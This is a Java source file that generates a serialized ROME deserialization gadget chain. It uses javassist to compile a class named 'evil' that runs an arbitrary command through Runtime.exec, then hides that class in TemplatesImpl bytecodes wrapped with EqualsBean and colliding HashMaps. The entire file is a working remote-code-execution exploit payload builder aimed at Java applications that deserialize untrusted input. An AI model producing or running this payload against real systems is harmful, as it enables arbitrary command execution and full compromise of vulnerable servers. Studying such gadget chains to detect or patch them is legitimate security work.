package top.racerz.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Rome {
    public static byte[] getPayload(String command) throws Exception {
        TemplatesImpl templates = getTemplatesImpl(command);
        EqualsBean bean = new EqualsBean(String.class, "");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa", templates);
        map1.put("bB", bean);
        map2.put("aa", bean);
        map2.put("bB", templates);
        HashMap map = new HashMap();
        map.put(map1, "");
        map.put(map2, "");

        setFieldValue(bean, "_beanClass", Templates.class);
        setFieldValue(bean, "_obj", templates);

        byte[] serialize = serialize(map);

        return serialize;
        // unserialize(serialize);
    }

    public static TemplatesImpl getTemplatesImpl(String command) throws Exception {
        byte[][] bytes = {generate(command)};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_tfactory", null);

        return templates;
    }

    public static byte[] generate(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("evil");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + command + "\");");
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    public static void setFieldValue(Object obj, String field, Object value) throws Exception {
        Field field1 = obj.getClass().getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream arr = new ByteArrayOutputStream();
        try {
            ObjectOutputStream output = new ObjectOutputStream(arr);
            output.writeObject(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return arr.toByteArray();
    }

    public static Object unserialize(byte[] arr) throws Exception {
        Object obj = null;
        try {
            ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(arr));
            obj = input.readObject();
        }catch (Exception e) {
            e.printStackTrace();
        }
        return obj;
    }
}
